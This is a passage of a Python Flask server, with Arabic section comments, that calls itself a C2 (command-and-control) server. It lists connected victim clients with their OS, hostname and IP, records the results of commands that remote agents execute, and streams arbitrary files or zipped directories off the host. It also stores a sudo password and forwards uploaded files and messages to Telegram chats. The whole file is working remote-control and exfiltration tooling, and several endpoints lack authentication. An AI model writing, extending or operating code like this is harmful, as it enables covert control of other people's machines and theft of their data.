        try:
            if now - float(ls) <= CLIENT_OFFLINE_AFTER_SEC:
                continue
        except (TypeError, ValueError):
            continue
        stale.append(cid)
    for cid in stale:
        clients.pop(cid, None)
        sessions.pop(cid, None)
        telegram_clients.discard(cid)
        tg_sessions.pop(cid, None)
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM clients WHERE id=?", (cid,))
            conn.commit()
            conn.close()
        except Exception as e:
            logger.warning("Could not delete stale client from DB (%s): %s", cid, e)
    if stale:
        logger.info("🧹 Removed offline clients: %s", ", ".join(stale))


@app.route("/clients", methods=["GET"])
@rate_limit
def get_clients():
    _prune_offline_clients()
    readable = {}

    for cid, info in clients.items():
        readable[cid] = {
            "last_seen": time.ctime(info["last_seen"]),
            "timestamp": info["last_seen"],
            "is_server": (cid == "[C2-Server]"),
            "os": info.get("os", ""),
            "hostname": info.get("hostname", ""),
            "ip": info.get("ip", ""),
        }

    return jsonify(readable)

# ======================== 9. إرسال لتليجرام ========================
@app.route("/send_to_telegram", methods=["POST"])
@rate_limit
@require_auth
def send_to_telegram():
    data    = request.json
    message = data.get("message", "").strip()

    if not TOKEN or not TOKEN.strip():
        return jsonify({"error": "No bot token configured. Add it from the Telegram settings page."}), 400

    if not ALL_CHATS:
        return jsonify({"error": "No chat IDs configured. Add them from the Telegram settings page."}), 400

    if not message:
        return jsonify({"error": "Message is empty."}), 400

    url     = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    results = []
    any_ok  = False

    for chat_id in ALL_CHATS:
        try:
            r    = requests.post(url, json={"chat_id": chat_id, "text": message}, timeout=10)
            body = r.json()
            if r.ok and body.get("ok"):
                results.append({"chat_id": chat_id, "status": "sent"})
                any_ok = True
            else:
                desc = body.get("description", f"HTTP {r.status_code}")
                results.append({"chat_id": chat_id, "error": desc})
                logger.warning(f"Telegram send failed for {chat_id}: {desc}")
        except Exception as e:
            results.append({"chat_id": chat_id, "error": str(e)})

    status_code = 200 if any_ok else 502
    return jsonify({"results": results}), status_code

# ======================== 9b. إرسال صورة لتليجرام ========================
@app.route("/send_photo_to_telegram", methods=["POST"])
@rate_limit
@require_auth
def send_photo_to_telegram():
    if 'photo' not in request.files:
        return jsonify({"error": "No photo provided"}), 400

    if not TOKEN or not TOKEN.strip():
        return jsonify({"error": "No bot token configured."}), 400

    photo            = request.files['photo']
    filename         = photo.filename or "photo.jpg"
    target_chat_id   = request.form.get('target_chat_id', '').strip()
    url              = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"

    # Determine which chats to send to
    chats_to_send = [target_chat_id] if target_chat_id else ALL_CHATS
    if not chats_to_send:
        return jsonify({"error": "No chat IDs configured. Add them from the Telegram settings page."}), 400

    # ── Save file to server ──────────────────────────────────────────
    uploads_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "uploads")
    os.makedirs(uploads_dir, exist_ok=True)
    save_path = os.path.join(uploads_dir, f"{int(time.time())}_{filename}")
    photo.seek(0)
    photo.save(save_path)
    logger.info(f"📁 Photo saved to {save_path}")

    # ── Log to DB ────────────────────────────────────────────────────
    target_label = target_chat_id if target_chat_id else "all chats"
    save_log_to_db(time.time(), "photo", f"[dashboard upload] {filename} → saved to {save_path} | sent to {target_label}", "dashboard")

    # ── Send to Telegram chats ───────────────────────────────────────
    results = []
    any_ok  = False
    for chat_id in chats_to_send:
        try:
            with open(save_path, "rb") as f:
                r    = requests.post(url, data={"chat_id": chat_id}, files={"photo": f}, timeout=30)
                body = r.json()
            if r.ok and body.get("ok"):
                results.append({"chat_id": chat_id, "status": "sent"})
                any_ok = True
            else:
                desc = body.get("description", f"HTTP {r.status_code}")
                results.append({"chat_id": chat_id, "error": desc})
        except Exception as e:
            results.append({"chat_id": chat_id, "error": str(e)})

    status_code = 200 if any_ok else 502
    return jsonify({"results": results, "saved_to": save_path}), status_code

# ======================== 9c. إرسال ملف لتليجرام ========================
@app.route("/send_file_to_telegram", methods=["POST"])
@rate_limit
@require_auth
def send_file_to_telegram():
    if 'file' not in request.files:
        return jsonify({"error": "No file provided"}), 400

    if not TOKEN or not TOKEN.strip():
        return jsonify({"error": "No bot token configured."}), 400

    file             = request.files['file']
    filename         = file.filename or "file.bin"
    target_chat_id   = request.form.get('target_chat_id', '').strip()
    url              = f"https://api.telegram.org/bot{TOKEN}/sendDocument"

    # Determine which chats to send to
    chats_to_send = [target_chat_id] if target_chat_id else ALL_CHATS
    if not chats_to_send:
        return jsonify({"error": "No chat IDs configured. Add them from the Telegram settings page."}), 400

    # ── Save file to server ──────────────────────────────────────────
    uploads_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "uploads")
    os.makedirs(uploads_dir, exist_ok=True)
    save_path = os.path.join(uploads_dir, f"{int(time.time())}_{filename}")
    file.seek(0)
    file.save(save_path)
    logger.info(f"📁 File saved to {save_path}")

    # ── Log to DB ────────────────────────────────────────────────────
    size_kb      = os.path.getsize(save_path) / 1024
    target_label = target_chat_id if target_chat_id else "all chats"
    save_log_to_db(time.time(), "file", f"[dashboard upload] {filename} ({size_kb:.1f} KB) → saved to {save_path} | sent to {target_label}", "dashboard")

    # ── Send to Telegram chats ───────────────────────────────────────
    results = []
    any_ok  = False
    for chat_id in chats_to_send:
        try:
            with open(save_path, "rb") as f:
                r    = requests.post(
                    url,
                    data={"chat_id": chat_id},
                    files={"document": (filename, f, "application/octet-stream")},
                    timeout=30,
                )
                body = r.json()
            if r.ok and body.get("ok"):
                results.append({"chat_id": chat_id, "status": "sent"})
                any_ok = True
            else:
                desc = body.get("description", f"HTTP {r.status_code}")
                results.append({"chat_id": chat_id, "error": desc})
        except Exception as e:
            results.append({"chat_id": chat_id, "error": str(e)})

    status_code = 200 if any_ok else 502
    return jsonify({"results": results, "saved_to": save_path}), status_code

# ======================== 10. مسح السجلات ========================
@app.route("/clear", methods=["DELETE"])
@rate_limit
@require_auth
def clear_logs():
    global clients_data
    clients_data = []
    try:
        conn = sqlite3.connect(DB_PATH)
        conn.execute('DELETE FROM logs')
        conn.commit()
        conn.close()
    except:
        pass
    return jsonify({"status": "cleared"})

# ======================== 11. إحصائيات ========================
@app.route("/stats", methods=["GET"])
@rate_limit
def get_stats():
    _prune_offline_clients()
    uptime = time.time() - app.start_time
    return jsonify({
        "total_clients": len(clients),
        "total_logs": len(clients_data),
        "pending_commands": len([c for c in commands if isinstance(c, str)]),
        "server_uptime": round(uptime),
        "bot_status": check_bot_status()
    })

# ======================== 12. إدارة إعدادات تليجرام ========================
@app.route("/telegram_config", methods=["GET"])
@rate_limit
def get_telegram_config():
    has_token = bool(TOKEN and TOKEN.strip())
    masked = ""
    if has_token:
        t = TOKEN.strip()
        if len(t) > 12:
            masked = t[:8] + "••••" + t[-4:]
        else:
            masked = "••••"
    return jsonify({
        "has_token": has_token,
        "masked_token": masked,
        "chat_ids": ALL_CHATS,
        "c2_group_id": C2_GROUP_ID,
        "c2_channel_id": C2_CHANNEL_ID,
    })

@app.route("/update_telegram_settings", methods=["POST"])
@rate_limit
@require_auth
def update_telegram_settings():
    global TOKEN, ALL_CHATS, C2_GROUP_ID, C2_CHANNEL_ID, C2_BOT_TOKEN
    data = request.json or {}
    cfg = {}
    if os.path.exists(TELEGRAM_CONFIG_PATH):
        try:
            with open(TELEGRAM_CONFIG_PATH, 'r', encoding='utf-8') as f:
                cfg = json.load(f)
        except Exception:
            cfg = {}
    if "token" in data:
        TOKEN = data["token"]
    if "chat_ids" in data:
        ALL_CHATS = data["chat_ids"]
    cfg["token"] = TOKEN
    cfg["chat_ids"] = ALL_CHATS
    if "c2_group_id" in data and data["c2_group_id"] is not None and str(data["c2_group_id"]).strip():
        cfg["c2_group_id"] = str(data["c2_group_id"]).strip()
    if "c2_channel_id" in data and data["c2_channel_id"] is not None and str(data["c2_channel_id"]).strip():
        cfg["c2_channel_id"] = str(data["c2_channel_id"]).strip()
    C2_GROUP_ID, C2_CHANNEL_ID = resolve_c2_chats(cfg)
    C2_BOT_TOKEN = (TOKEN or _DEFAULT_TOKEN).strip()
    _save_telegram_config()
    logger.info(f"📍 Telegram settings updated — group: {C2_GROUP_ID}  channel: {C2_CHANNEL_ID}")
    return jsonify({"status": "updated"})

@app.route("/telegram_config", methods=["DELETE"])
@rate_limit
@require_auth
def delete_telegram_config():
    global TOKEN, ALL_CHATS, C2_GROUP_ID, C2_CHANNEL_ID, C2_BOT_TOKEN
    TOKEN     = ""
    ALL_CHATS = []
    C2_GROUP_ID, C2_CHANNEL_ID = resolve_c2_chats({})
    C2_BOT_TOKEN = (_DEFAULT_TOKEN or "").strip()
    _save_telegram_config()
    logger.info("🗑️ Telegram config cleared")
    return jsonify({"status": "deleted"})

# ======================== 13. إعدادات السيرفر ========================
@app.route("/server_config", methods=["GET"])
@rate_limit
@require_auth
def get_server_config():
    return jsonify({
        "has_sudo_password": bool(SUDO_PASSWORD),
        "sudo_password_hint": "••••" if SUDO_PASSWORD else "",
    })

@app.route("/server_config", methods=["POST"])
@rate_limit
@require_auth
def update_server_config():
    global SUDO_PASSWORD
    data = request.json or {}
    if "sudo_password" in data:
        SUDO_PASSWORD = data["sudo_password"]
        _save_server_config()
        logger.info("🔑 Sudo password updated")
    return jsonify({"status": "updated"})

@app.route("/server_config", methods=["DELETE"])
@rate_limit
@require_auth
def delete_server_config():
    global SUDO_PASSWORD
    SUDO_PASSWORD = ""
    _save_server_config()
    logger.info("🗑️ Sudo password cleared")
    return jsonify({"status": "cleared"})

# ======================== 13b. معلومات shell الـ C2-Server ========================
@app.route("/server_info", methods=["GET"])
@rate_limit
@require_auth
def server_info():
    """Return current shell state (user, hostname, cwd) for the terminal prompt."""
    return jsonify({
        "user":     C2_USER,
        "hostname": socket.gethostname(),
        "cwd":      _format_cwd_display(C2_CWD),
        "is_root":  (C2_USER == "root" or os.geteuid() == 0),
    })

# ======================== 13c. تحميل ملف من السيرفر ========================
@app.route("/download_file", methods=["GET"])
@rate_limit
@require_auth
def download_file():
    """Stream a file from the server to the client (browser download)."""
    from flask import send_file as flask_send_file
    path = request.args.get("path", "").strip()

    if not path:
        return jsonify({"error": "path parameter is required"}), 400

    # Expand ~ and relative paths from current shell CWD
    if path.startswith("~"):
        path = os.path.expanduser(path)
    elif not os.path.isabs(path):
        path = os.path.join(C2_CWD, path)
    path = os.path.normpath(path)

    if not os.path.exists(path):
        return jsonify({"error": f"No such file or directory: {path}"}), 404

    # If it's a directory, zip it on-the-fly and stream the zip
    if os.path.isdir(path):
        import zipfile, io as _io
        zip_buf  = _io.BytesIO()
        zip_name = os.path.basename(path.rstrip("/")) + ".zip"
        try:
            with zipfile.ZipFile(zip_buf, "w", zipfile.ZIP_DEFLATED) as zf:
                for root, _, files in os.walk(path):
                    for fname in files:
                        fpath   = os.path.join(root, fname)
                        arcname = os.path.relpath(fpath, os.path.dirname(path))
                        zf.write(fpath, arcname)
            zip_buf.seek(0)
            logger.info(f"📥 Directory zip download: {path}")
            save_log_to_db(time.time(), "download", f"[dashboard download dir] {path} → {zip_name}", "dashboard")
            from flask import send_file as flask_send_file
            return flask_send_file(
                zip_buf, as_attachment=True,
                download_name=zip_name,
                mimetype="application/zip",
            )
        except Exception as ze:
            return jsonify({"error": f"Failed to zip directory: {ze}"}), 500

    # Safety: cap at 100 MB
    size = os.path.getsize(path)
    if size > 100 * 1024 * 1024:
        return jsonify({"error": f"File too large ({size // (1024*1024)} MB). Max 100 MB."}), 413

    filename = os.path.basename(path)
    logger.info(f"📥 File download: {path} ({size} bytes)")
    save_log_to_db(time.time(), "download", f"[dashboard download] {path} ({size} bytes)", "dashboard")

    from flask import send_file as flask_send_file
    return flask_send_file(path, as_attachment=True, download_name=filename)

# ======================== 13d. اختبار ========================
@app.route("/test_data", methods=["POST"])
@rate_limit
def test_data():
    data = request.json
    clients_data.append(data)
    return "OK"

# ======================== 14. مراقبة الصحة ========================
@app.route("/health", methods=["GET"])
def health_check():
    return jsonify({"status": "healthy", "uptime": time.time() - app.start_time})

# ======================== 15. تصدير CSV ========================
@app.route("/export/logs", methods=["GET"])
@rate_limit
@require_auth
def export_logs():
    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(["Timestamp", "Type", "Data", "Client ID", "Chat ID"])
    for log in clients_data:
        writer.writerow([
            time.ctime(log.get("timestamp", time.time())),
            log.get("type", ""),
            log.get("data", ""),
            log.get("client_id", ""),
            log.get("chat_id", "")
        ])
    return Response(output.getvalue(), mimetype="text/csv", headers={"Content-Disposition": "attachment;filename=logs.csv"})

# ======================== 16. تاريخ الأوامر ========================
@app.route("/commands/history", methods=["GET"])
@rate_limit
@require_auth
def commands_history():
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute(
            'SELECT id, command, client_id, status, result, created_at, executed_at, cwd '
            'FROM commands ORDER BY id DESC LIMIT 100'
        )
        rows = cursor.fetchall()
        conn.close()
        history = []
        for row in rows:
            history.append({
                "id":          row[0],
                "command":     row[1],
                "client_id":   row[2],
                "status":      row[3],
                "result":      row[4],
                "created_at":  time.ctime(row[5]) if row[5] else None,
                "executed_at": time.ctime(row[6]) if row[6] else None,
                "cwd":         row[7],
            })
        return jsonify(history)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/command/<int:cmd_id>", methods=["GET"])
@rate_limit
@require_auth
def get_command_by_id(cmd_id):
    """جلب حالة ونتيجة أمر معين بالـ ID"""
    try:
        conn = sqlite3.connect(DB_PATH)
        row = conn.execute(
            'SELECT id, command, client_id, status, result, created_at, executed_at '
            'FROM commands WHERE id=?',
            (cmd_id,)
        ).fetchone()
        conn.close()
        if not row:
            return jsonify({"error": "Command not found"}), 404
        return jsonify({
            "id":          row[0],
            "command":     row[1],
            "client_id":   row[2],
            "status":      row[3],
            "result":      row[4],
            "created_at":  row[5],
            "executed_at": row[6],
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/command_result", methods=["POST"])
@rate_limit
def command_result():
    """Agent calls this after executing a command to submit the result."""
    data = request.json
    command_id = data.get("command_id")
    result     = data.get("result", "")
    status     = data.get("status", "done")   # done | error

    if not command_id:
        return jsonify({"error": "command_id required"}), 400

    try:
        conn = sqlite3.connect(DB_PATH)
        conn.execute(
            'UPDATE commands SET status=?, result=?, executed_at=? WHERE id=?',
            (status, result, time.time(), command_id)
        )
        conn.commit()
        conn.close()
        logger.info(f"✅ Command {command_id} result received — status: {status}")
        return jsonify({"status": "ok"})
    except Exception as e:
        logger.error(f"Failed to save command result: {e}")
        return jsonify({"error": str(e)}), 500

# ======================== التشغيل ========================
init_db()
load_data_from_db()
app.start_time = time.time()
logger.info("🚀 C2 Server Started")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
